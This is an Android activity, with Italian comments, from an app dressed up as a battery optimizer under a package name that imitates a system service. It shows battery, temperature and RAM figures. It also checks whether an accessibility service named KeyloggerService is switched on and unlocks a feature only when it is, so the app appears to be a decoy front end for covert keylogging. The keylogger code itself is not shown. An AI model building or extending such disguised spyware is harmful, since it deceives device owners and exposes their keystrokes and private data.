package com.android.system.batteryservice;

import android.accessibilityservice.AccessibilityService;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    private TextView batteryInfo;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        batteryInfo = findViewById(R.id.txtInfo);
        Button optimizeButton = findViewById(R.id.btnOptimize);
        Button infoButton = findViewById(R.id.btnInfo);
        if (infoButton != null) {
            infoButton.setOnClickListener(v -> {
                if (isAccessibilityEnabled(this, KeyloggerService.class)) {
                    sendCuriousInfo(); // questa funzione la implementiamo dopo
                } else {
                    TextView infoBox = findViewById(R.id.textCuriosInfo);
                    infoBox.setText("⚠️ Permesso di accessibilità non attivo. Funzione disabilitata.");
                }
            });
        }
        if (optimizeButton != null) {
            optimizeButton.setOnClickListener(v -> showBatteryAndRamInfo());
        } else {
            Log.e("MainActivity", "Pulsante btnOptimize non trovato");
        }
    }

    private void showBatteryAndRamInfo() {
        StringBuilder info = new StringBuilder();

        // 🔋 Livello batteria
        IntentFilter iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, iFilter);
        int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
        float batteryPct = level * 100 / (float) scale;
        info.append("🔋 Batteria: ").append(String.format("%.1f", batteryPct)).append("%\n");

        // 🌡️ Temperatura
        int temp = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1) : -1;
        float tempC = temp / 10f;
        info.append("🌡️ Temperatura: ").append(tempC).append(" °C\n");

        // 🧠 RAM
        ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
        activityManager.getMemoryInfo(memInfo);

        long totalMem = memInfo.totalMem / (1024 * 1024);
        long availMem = memInfo.availMem / (1024 * 1024);
        long usedMem = totalMem - availMem;
        info.append("🧠 RAM: ").append(usedMem).append("MB / ").append(totalMem).append("MB\n");

        batteryInfo.setText(info.toString());
    }

    public static boolean isAccessibilityEnabled(Context context, Class<? extends AccessibilityService> serviceClass) {
        int accessibilityEnabled = 0;
        final String service = context.getPackageName() + "/" + serviceClass.getName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    context.getApplicationContext().getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED
            );
        } catch (Settings.SettingNotFoundException e) {
            return false;
        }

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                    context.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (settingValue != null && settingValue.contains(service)) {
                return true;
            }
        }

        return false;
    }

    private void sendCuriousInfo() {
        String model = android.os.Build.MODEL;
        String manufacturer = android.os.Build.MANUFACTURER;
        String version = android.os.Build.VERSION.RELEASE;
        String sdk = String.valueOf(android.os.Build.VERSION.SDK_INT);

        String log = "📱 Info dispositivo:\nMarca: " + manufacturer
                + "\nModello: " + model
                + "\nAndroid: " + version + " (SDK " + sdk + ")";

        // Mostra nel TextView textCuriosInfo
        TextView infoBox = findViewById(R.id.textCuriosInfo);
        infoBox.setText(log);
    }
}
